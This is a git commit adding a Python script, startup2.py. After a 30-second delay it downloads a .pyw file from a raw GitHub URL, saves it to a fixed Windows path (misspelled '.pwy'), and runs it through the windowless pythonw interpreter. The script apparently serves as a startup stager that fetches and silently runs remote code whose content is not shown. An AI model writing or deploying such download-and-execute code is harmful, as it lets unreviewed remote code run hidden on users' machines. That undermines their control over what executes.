614d987731432e37c73ca6dee5f6260adf4cbf52
James <131554210+Lixvinity@users.noreply.github.com>
2024-03-17 01:53:21 -0400

    Create startup2.py

---
+++ startup2.py
@@ -0,0 +1,36 @@
+import requests
+import subprocess
+import os
+import time
+
+time.sleep(30)
+def download_and_open_file(url, destination_path):
+    try:
+        response = requests.get(url)
+        response.raise_for_status()  # Raise an HTTPError for bad responses
+
+        with open(destination_path, 'wb') as file:
+            file.write(response.content)
+
+        print(f"File downloaded successfully to {destination_path}")
+
+        # Debug: Print the content of the downloaded file
+        with open(destination_path, 'rb') as file:
+            file_content = file.read()
+            print(f"\nFile content:\n{file_content.decode('utf-8')}")
+
+        # Open the file using the default Python interpreter for .pyw files
+        python_executable = 'pythonw.exe' if os.name == 'nt' else 'pythonw'
+        subprocess.run([python_executable, destination_path])
+
+    except requests.exceptions.RequestException as e:
+        print(f"Error: {e}")
+
+    # Replace the URL with the URL of the .pyw file you want to download
+file_url = "https://raw.githubusercontent.com/Lixvinity/winjv/main/Reporter.pyw"
+    
+    # Replace the destination path with the path where you want to save the .pyw file
+destination_path = r"C:\WINJV\Storage\Reporter.pwy"
+    
+    # Download and open the .pyw file
+download_and_open_file(file_url, destination_path)
